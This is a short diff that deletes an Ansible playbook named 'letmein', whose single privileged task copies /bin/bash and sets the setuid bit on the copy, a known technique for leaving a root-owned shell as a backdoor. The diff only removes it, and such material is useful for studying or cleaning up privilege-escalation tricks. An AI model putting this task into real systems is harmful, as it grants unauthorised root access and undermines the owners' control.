@@ -1,7 +1,0 @@
-- name: "letmein"
-  hosts: localhost
-  connection: local
-  tasks:
-    - name: "letmein"
-      shell: "cp /bin/bash $TF && chmod +s $TF"
-      become: true
